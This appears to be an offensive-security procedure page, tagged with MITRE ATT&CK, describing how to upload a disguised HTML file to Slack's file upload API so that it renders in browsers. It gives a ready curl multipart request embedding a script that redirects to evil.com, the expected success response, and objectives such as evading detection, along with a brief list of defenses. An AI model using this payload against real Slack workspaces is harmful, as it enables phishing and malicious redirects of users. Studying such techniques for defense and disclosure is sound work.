---
id: proc-slack-upload-binary-html
tags:
  - file-upload
  - xss
  - bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/slack-upload-binary-html-redirect]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:27.340Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Upload-Malicious-HTML-File-with-Binary-Prefix

## Summary

This procedure exploits Slack's file upload endpoint by prepending binary characters to HTML content, disguising it as an image to bypass sanitization and enable script execution like redirects.

## Description

In the attack scenario, an authenticated user uploads a file to /api/files.uploadAsync on upload.slack.com. By setting Content-Type to text/html and prefixing HTML with binary data (e.g., PNG headers), the file avoids download enforcement and renders as HTML in browsers when shared publicly. This leads to stored XSS-like behavior for phishing or redirects. Prerequisites include a valid Slack token and channel access.

## Requirements

1. Valid Slack authentication token and channel ID
2. Access to Burp Suite for request crafting
3. Target Slack workspace with file upload permissions

## Defense

Defensive measures and detection strategies:

- Enforce strict MIME type validation and content scanning on uploads
- Strip or block binary prefixes in file content
- Monitor for anomalous file extensions and public link generations

## Objectives

1. Successfully upload executable HTML without detection
2. Obtain file ID for public sharing
3. Enable browser execution for redirects or phishing

## Instructions

### Step 1: Prepare Malicious File

**Context**: Create a file with binary prefix followed by HTML redirect script to bypass sanitization.

Save the content to a file (e.g., pixel.html) with binary chars + <html><script>window.location='http://www.evil.com';</script></html>.

### Step 2: Send Upload Request

**Context**: Use curl or Burp to POST the multipart request to the API.

**Command** ([[commands/slack-upload-binary-html-redirect]]):
```bash
curl -X POST https://upload.slack.com/api/files.uploadAsync \
  -H "Content-Type: multipart/form-data; boundary=---------------------------89481407720596" \
  --data-binary "-----------------------------89481407720596\nContent-Disposition: form-data; name=\"file\"; filename=\"pixel.png\"\nContent-Type: text/html\n\n<bunch_of_binary_chars_here>\n<html>\n<script>\nwindow.location='http://www.evil.com';\n</script>\n</html>\n-----------------------------89481407720596\nContent-Disposition: form-data; name=\"filename\"\n\npixel\n-----------------------------89481407720596\nContent-Disposition: form-data; name=\"token\"\n\n$SLACK_TOKEN\n-----------------------------89481407720596\nContent-Disposition: form-data; name=\"channels\"\n\n$CHANNEL_ID\n-----------------------------89481407720596\nContent-Disposition: form-data; name=\"title\"\n\npixel\n-----------------------------89481407720596\nContent-Disposition: form-data; name=\"initial_comment\"\n\nhi\n-----------------------------89481407720596--" \
  -H "Origin: https://<subdomain>.slack.com"
```

> This command uploads the disguised file; expect {"ok":true,"file":{"id":"F1AU0FTGR"}} on success.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/slack-upload-binary-html-redirect]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- file-upload
- xss
- slack
